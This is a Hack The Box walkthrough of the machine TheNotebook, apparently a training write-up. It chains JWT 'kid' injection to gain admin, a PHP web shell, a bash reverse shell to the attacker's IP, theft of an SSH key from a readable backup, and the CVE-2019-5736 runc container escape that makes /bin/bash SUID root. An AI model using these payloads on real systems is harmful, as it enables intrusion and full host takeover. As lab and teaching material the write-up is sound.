# HTB: TheNotebook — Complete Walkthrough

**Target IP:** `10.129.13.33`  
**Attacker IP (Kali):** `10.10.16.84`  
**OS:** Linux (Ubuntu 18.04)  
**Difficulty:** Medium  
**Flags:**
- User: `d208e[redacted]e762a26`
- Root: `513fca[redacted]3ff500d5`

---

## Table of Contents
1. [Initial Reconnaissance](#phase-1-initial-reconnaissance)
2. [Web Enumeration & JWT Discovery](#phase-2-web-enumeration--jwt-discovery)
3. [JWT Theory & The `kid` Injection](#phase-3-jwt-theory--the-kid-injection)
4. [Forging Admin Access](#phase-4-forging-admin-access)
5. [Web Shell Upload & Execution](#phase-5-web-shell-upload--execution)
6. [Shell Stabilization & Enumeration](#phase-6-shell-stabilization--enumeration)
7. [Lateral Movement to Noah](#phase-7-lateral-movement-to-noah)
8. [Privilege Escalation: Docker Analysis](#phase-8-privilege-escalation-docker-analysis)
9. [CVE-2019-5736: Theory of the Runc Escape](#phase-9-cve-2019-5736-theory-of-the-runc-escape)
10. [Exploitation: Container Breakout](#phase-10-exploitation-container-breakout)
11. [Root Access](#phase-11-root-access)
12. [Key Takeaways & Hacker Mindset](#phase-12-key-takeaways--hacker-mindset)

---

## Phase 1: Initial Reconnaissance

### What We Did
```bash
nmap -p- --min-rate 10000 10.129.13.33
nmap -p 22,80 -sCV 10.129.13.33
```

### Results
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    nginx 1.14.0 (Ubuntu)
```

### Hacker Mindset
**Why nmap first?** Before attacking anything, we need to understand the attack surface. Port scanning tells us what services are listening, what versions are running, and gives us our first clues about the operating system. The `--min-rate 10000` speeds up the scan by sending packets faster — on HTB, speed matters when boxes reset.

**What do these results tell us?**
- **SSH (22):** OpenSSH 7.6p1 on Ubuntu. This version is from Ubuntu 18.04 Bionic. No obvious public exploit for this specific version, but it's our likely lateral movement path later.
- **HTTP (80):** nginx 1.14.0. A webserver means a web application, and web applications are the #1 attack vector on HTB boxes. This is where we focus our energy.
- **Only 2 ports open:** This is a "web → user → root" style box. The foothold will be through the web application.

**Why not attack SSH directly?** Brute-forcing SSH is slow, noisy, and rarely works on HTB. We only use SSH after we've obtained credentials or keys through other means.

---

## Phase 2: Web Enumeration & JWT Discovery

### What We Did
1. Visited `http://10.129.13.33` — found a note-taking application
2. Clicked **Register** and created an account
3. Logged in and observed the cookie
4. Directory brute-force discovered `/admin` (403 Forbidden)

### Hacker Mindset
**Why register for an account?** Many web apps have different functionality for authenticated vs. unauthenticated users. By registering, we get a valid session and can explore the authenticated attack surface. We also get to see how the application handles authentication — cookies, tokens, session IDs, etc.

**The auth cookie we received:**
```
auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6InRlc3R1c2VyIiwiZW1haWwiOiJ0ZXN0QHRlc3QudGVzdCwiYWRtaW5fY2FwIjowfQ.[signature]
```

**Why does this cookie look suspicious?**
- It's separated by periods (`.`). This is the classic structure of a **JSON Web Token (JWT)**: `header.payload.signature`
- JWTs are extremely common in modern web apps but are also frequently misconfigured
- The presence of `/admin` returning 403 suggests there's an authorization check we need to bypass

**Why check cookies?** The cookie is the application's way of tracking who you are. If we can forge or manipulate it, we can become someone else — like an admin.

---

## Phase 3: JWT Theory & The `kid` Injection

### Decoding the JWT
Using [jwt.io](https://jwt.io) or Python, we decode the token:

**Header:**
```json
{
  "typ": "JWT",
  "alg": "RS256",
  "kid": "http://localhost:7070/privKey.key"
}
```

**Payload:**
```json
{
  "username": "testuser",
  "email": "test@test.test",
  "admin_cap": 0
}
```

### Hacker Mindset: Understanding JWTs
**What is RS256?** It's RSA-with-SHA256, an **asymmetric** algorithm. The server signs the token with a **private key**, and anyone can verify it with the corresponding **public key**.

**What is `kid`?** The "Key ID" header parameter tells the server WHICH key to use for verification. It's supposed to be an internal identifier (like "key-1" or "prod-signing-key").

**Why is this `kid` suspicious?** 
Instead of an internal identifier, it's a **full URL**: `http://localhost:7070/privKey.key`

This means the server is **dynamically fetching the verification key from a URL** every time it validates a token. That's not how `kid` is supposed to work — `kid` should map to a pre-configured key in a local store (database, file system, etc.).

**The vulnerability:** If the server fetches the verification key from an arbitrary URL specified in the JWT header, we can change that URL to point to a key WE control. This is called **JWT Key ID (`kid`) Injection** or **JWT Key Confusion via `kid`**.

**Why does this work?**
1. We generate our own RSA key pair
2. We sign a forged JWT with our private key
3. We set `kid` to point to our server: `http://10.10.16.84:7070/privKey.key`
4. The target server fetches our key from our server
5. The target verifies our signature against our key → validation passes
6. The target trusts the payload → we become admin

**The "admin_cap" field:** This is a custom claim in the payload. `0` = regular user, `1` = admin. By changing this to `1`, the application will treat us as an administrator.

---

## Phase 4: Forging Admin Access

### Step-by-Step Exploitation

#### 1. Generate our own RSA private key
```bash
openssl genrsa -out privKey.key 2048
```

**Why generate a key?** We need to sign our forged JWT with a private key. The server will then fetch the corresponding public key (or in this case, the private key file itself) from our server to verify the signature.

#### 2. Host the key
```bash
python3 -m http.server 7070
```

**Why host it?** The `kid` URL must be accessible from the target server. By running a simple Python HTTP server, we can serve our key file.

#### 3. Forge the JWT
We used a Python script to create the forged token:

```python
import jwt

private_key = open('privKey.key', 'r').read()

headers = {
    "typ": "JWT",
    "alg": "RS256",
    "kid": "http://10.10.16.84:7070/privKey.key"
}

payload = {
    "username": "testuser",
    "email": "test@test.test",
    "admin_cap": 1
}

token = jwt.encode(payload, private_key, algorithm="RS256", headers=headers)
print(token)
```

**What changed?**
- `kid`: Changed from `localhost:7070` to our Kali IP `10.10.16.84:7070`
- `admin_cap`: Changed from `0` to `1`
- Signed with OUR private key instead of the server's

#### 4. Replace the cookie and access /admin
- Open browser DevTools → Application → Cookies
- Replace the `auth` cookie with the forged token
- Visit `http://10.129.13.33/admin`

**What happened?** The target server made an HTTP request to our Kali machine at `10.10.16.84:7070/privKey.key`, fetched our key, verified the signature, saw `admin_cap: 1`, and granted us admin access.

### Hacker Mindset
**Why does the server trust our key?** Because the developer made a critical mistake: they allowed the `kid` parameter to contain an arbitrary URL and didn't validate it against a whitelist. In a secure application, the server should only use pre-configured keys from trusted sources, never fetch keys from user-supplied URLs.

**What if it didn't work?** Common failure points:
- Wrong IP in `kid` (must be reachable from target)
- HTTP server not running or blocked by firewall
- Wrong key file being served (must match the signing key)
- The server might require `https://` instead of `http://`

---

## Phase 5: Web Shell Upload & Execution

### What We Found in Admin Panel
The admin panel had:
- View Notes (all users' notes)
- Upload File functionality

One note hinted: "PHP files are being executed" and "regular backups scheduled."

### Uploading the Shell
Created `shell.php`:
```php
<?php system($_REQUEST["cmd"]); ?>
```

Uploaded it. The server renamed it to a hex string but kept the `.php` extension:
```
a1ba6293840f8a8fb4d5dda74c98c90a.php
```

### Verifying Execution
```
http://10.129.13.33/a1ba6293840f8a8fb4d5dda74c98c90a.php?cmd=id
```

Output:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Hacker Mindset
**Why PHP?** The note explicitly told us PHP was being executed. This is a huge hint — the developer left a breadcrumb. Always read notes, comments, and source code carefully.

**Why a simple one-liner?** We don't need a full reverse shell payload yet. A minimal `system()` wrapper gives us RCE (Remote Code Execution) with the smallest possible file. We can use it to trigger a reverse shell later.

**The architecture quirk:** This box has a fascinating setup:
- nginx listens on port 80
- For `.php` files → forwarded to PHP-FPM (executes on the **host**)
- For everything else → proxied to a Docker container on port 8080

This means our PHP shell executes on the **host machine**, not in the container! This is crucial because it gives us direct host access instead of being trapped in a container.

**Why does this matter?** If the upload had gone to the Docker container, we'd be containerized and need to escape. But because PHP files are handled by the host's PHP-FPM, our shell runs directly on the host as `www-data`.

---

## Phase 6: Shell Stabilization & Enumeration

### Getting a Proper Shell
Using the web shell, we triggered a reverse shell:

```bash
# Kali listener
nc -lnvp 4444
```

```bash
# Via browser/curl
curl --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.16.84/4444 0>&1'" \
  -G -s "http://10.129.13.33/a1ba6293840f8a8fb4d5dda74c98c90a.php"
```

### Upgrading the Shell
```bash
# In reverse shell
script /dev/null -c bash
# Ctrl+Z to background nc
# In Kali terminal:
stty raw -echo; fg
reset
# Terminal type: screen
```

### Hacker Mindset
**Why stabilize the shell?** A basic netcat reverse shell:
- Has no job control (Ctrl+C kills it)
- Can't run interactive programs (vim, sudo, etc.)
- Doesn't handle special keys properly

Upgrading with `script` + `stty raw` gives us a proper TTY, making enumeration much easier.

### Enumeration as www-data
```bash
whoami  # www-data
id      # uid=33(www-data)
ls /home/  # Found user: noah
ls -la /var/backups/  # Found home.tar.gz
```

**Why check `/var/backups/`?** The admin note mentioned "regular backups scheduled." This is a classic example of following hints left by the box creator. Backups often contain sensitive data — passwords, private keys, configuration files.

---

## Phase 7: Lateral Movement to Noah

### Extracting the SSH Key
```bash
tar xf /var/backups/home.tar.gz -O home/noah/.ssh/id_rsa
```

This printed Noah's private RSA key. We saved it on Kali as `noah_id_rsa` and set proper permissions:

```bash
chmod 600 noah_id_rsa
ssh -i noah_id_rsa noah@10.129.13.33
```

### User Flag
```bash
cat ~/user.txt
# d208e5[redacted]0e762a26
```

### Hacker Mindset
**Why SSH keys?** SSH keys are the holy grail of lateral movement. If you find a private key, you can authenticate as that user without knowing their password. This is why `~/.ssh/` should always be checked during enumeration.

**Why was the backup world-readable?** The backup files in `/var/backups/` were owned by root but readable by anyone (`-rw-r--r--`). This is a permission misconfiguration — sensitive backups should never be world-readable.

**Why extract without writing to disk?** Using `tar -O` (stdout) lets us read the key without creating files on the target that might trigger alerts or leave evidence.

---

## Phase 8: Privilege Escalation: Docker Analysis

### Checking sudo Permissions
```bash
sudo -l
```

Output:
```
User noah may run the following commands on thenotebook:
    (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*
```

### Checking Docker Version
```bash
docker -v
# Docker version 18.06.0-ce, build 0ffa825
```

### Hacker Mindset
**Why check `sudo -l` first?** It's the golden rule of Linux privilege escalation. `sudo -l` tells you exactly what commands you can run as root without a password. Even a single misconfigured command can lead to full root access.

**Why is Docker dangerous?** Docker is essentially root access with extra steps. If you can run Docker commands as root, you can:
- Mount the host filesystem inside a container
- Escape containers using kernel vulnerabilities
- In this case, exploit a known Docker/runc vulnerability

**Why check the Docker version?** Docker version 18.06.0-ce is **old** (from mid-2018). Old software = vulnerabilities. A quick search reveals this version is vulnerable to **CVE-2019-5736**.

---

## Phase 9: CVE-2019-5736: Theory of the Runc Escape

### What is runc?
**runc** is the low-level container runtime that Docker uses under the hood. When you run `docker exec`, Docker calls runc to actually start the process inside the container. Runc is a small, privileged binary that runs as **root** on the host.

### The Vulnerability
CVE-2019-5736 is a critical vulnerability in runc (affecting versions before 1.0.0-rc7, used by Docker before 18.09.2). It allows an attacker with **root access inside a container** to overwrite the host's runc binary.

### How the Attack Works
1. **Overwrite `/bin/sh` inside the container** with a symlink to `/proc/self/exe`
2. **Wait for someone to run `docker exec`** on the host
3. When runc tries to execute `/bin/sh` inside the container, it follows the symlink to `/proc/self/exe` — which points to the **runc binary itself** on the host
4. **runc opens itself** (its own binary) to read/execute it
5. The attacker finds the PID of this runc process and opens `/proc/[pid]/exe` for writing
6. The attacker **overwrites the runc binary on the host** with a malicious payload
7. The next time anyone runs `docker exec`, the **malicious payload executes as root on the host**

### Hacker Mindset
**Why does this work?** It's a race condition combined with a confused deputy problem:
- `/proc/self/exe` is a special symlink that points to the currently running executable
- When runc executes `/bin/sh` (which is a symlink to `/proc/self/exe`), runc ends up executing **itself**
- While runc has its own binary open, the container's root can write to that same file through `/proc/[pid]/exe`
- Since runc is owned by root on the host, overwriting it gives us persistent root code execution

**Why is this so dangerous?** Because containers are supposed to be isolated. This vulnerability breaks that isolation completely — a container escape leads directly to host root access.

---

## Phase 10: Exploitation: Container Breakout

### Step 1: Build the Exploit
We downloaded the Go PoC from [Frichetten/CVE-2019-5736-PoC](https://github.com/Frichetten/CVE-2019-5736-PoC).

**The payload we used:**
```go
var payload = "#!/bin/bash \n chmod u+s /bin/bash"
```

This makes `/bin/bash` on the host SUID root, meaning anyone can run `bash -p` to get a root shell.

**Why SUID bash instead of SSH keys?** Our first attempt tried to write an SSH key to `/root/.ssh/authorized_keys`, but the exploit's race condition failed to complete the write. The SUID approach is more reliable because:
- It doesn't depend on `.ssh` directory existing or having correct permissions
- It doesn't depend on SSH configuration
- A single `chmod` system call is simpler than writing to a file

**Cross-compilation issue:** Our Kali was ARM64, but the target is x86_64. We installed the official Go compiler and cross-compiled:
```bash
export PATH=/usr/local/go/bin:$PATH
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o cve-2019-5736 cve-2019-5736.go
```

### Step 2: Two-Session Attack

**Session 1 — Inside the container:**
```bash
sudo /usr/bin/docker exec -it webapp-dev01 /bin/bash
cd /tmp
wget 10.10.16.84:8080/cve-2019-5736 -O cve-2019-5736
chmod +x cve-2019-5736
./cve-2019-5736
```

Output:
```
[+] Overwritten /bin/sh successfully
[+] Found the PID: 122
[+] Successfully got the file handle
[+] Successfully got the write handle &{0xc0004349c0}
[+] The command executed is#!/bin/bash 
 chmod u+s /bin/bash
```

**Session 2 — Trigger on the host:**
```bash
sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh
# Output: No help topic for '/bin/sh'
```

### Hacker Mindset
**Why two sessions?** The exploit needs a trigger. Session 1 sets the trap (overwrites `/bin/sh`), then waits. Session 2 springs the trap by running `docker exec`, which causes runc to execute and open itself. The exploit in Session 1 detects this and overwrites runc.

**Why does the trigger show a weird error?** Because `/bin/sh` has been overwritten with a symlink to `/proc/self/exe`. When runc tries to execute it, it's actually trying to execute itself with `/bin/sh` as an argument. Runc doesn't understand this, hence the bizarre error message — but the exploit has already fired by this point.

---

## Phase 11: Root Access

### The Payoff
In Session 2 (as noah on the host):
```bash
bash -p
whoami
# root
id
# uid=1000(noah) gid=1000(noah) euid=0(root) groups=1000(noah)
cat /root/root.txt
# 513fcaf[redacted]63ff500d5
```

### Hacker Mindset
**Why `bash -p`?** The `-p` flag tells bash to run with privileged mode, preserving the effective UID. Since `/bin/bash` is now SUID root, running `bash -p` gives us a root shell while keeping our noah identity for file ownership purposes.

**Why didn't we need a password?** The SUID bit bypasses all password checks. The binary runs with the permissions of its owner (root), not the user who launched it. This is a classic Unix privilege escalation technique.

---

## Phase 12: Key Takeaways & Hacker Mindset

### 1. Follow the Hints
The box creator left explicit hints:
- The JWT cookie with `kid` pointing to a URL
- The admin note saying "PHP files are being executed"
- The admin note about "regular backups"

**Lesson:** Always read everything. Notes, error messages, source code comments — they often contain the path forward.

### 2. Understand the Technology Stack
We didn't just blindly exploit JWT — we understood:
- How RS256 signing works (asymmetric cryptography)
- How `kid` is supposed to work vs. how it was misused
- How nginx proxies requests differently based on file extension
- How Docker and runc interact

**Lesson:** The more you understand the underlying technology, the faster you can identify misconfigurations.

### 3. Layered Security Failures
This box is a chain of failures:
1. JWT `kid` accepts arbitrary URLs → admin access
2. Admin file upload doesn't validate file type properly → web shell
3. PHP execution on host (not container) → direct host access
4. World-readable backups → SSH key exposure
5. Outdated Docker → container escape
6. Container escape → host root

**Lesson:** Real-world security is about chains. Breaking any one link stops the attack. As a defender, fix the weakest links first. As an attacker, find the chain.

### 4. Container Security is Host Security
Containers are NOT security boundaries by themselves. If a container runs as privileged, has dangerous capabilities, or the runtime is vulnerable, the host is compromised.

**Lesson:** Never run outdated container runtimes in production. CVE-2019-5736 was patched in 2019 — this box simulated what happens when you don't patch.

### 5. Persistence vs. One-Shot
Our first payload (SSH key) would have given persistent access even if the shell died. The SUID bash is also persistent. Always think about:
- How do I maintain access?
- How do I get back in if this shell dies?
- What evidence am I leaving behind?

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning and service enumeration |
| feroxbuster/ffuf | Directory brute-forcing |
| jwt.io / Python jwt | JWT decoding and forging |
| openssl | RSA key generation |
| python3 -m http.server | Hosting files for exfiltration/payload delivery |
| nc (netcat) | Reverse shell listener |
| script + stty | Shell stabilization |
| tar | Extracting files from archives |
| go | Building the CVE-2019-5736 exploit |
| ssh | Lateral movement and root access |

---

## Final Flags

```
User: d208e56[redacted]0e762a26
Root: 513fcaf[redacted]063ff500d5
```

**Box Complete!** 🎉
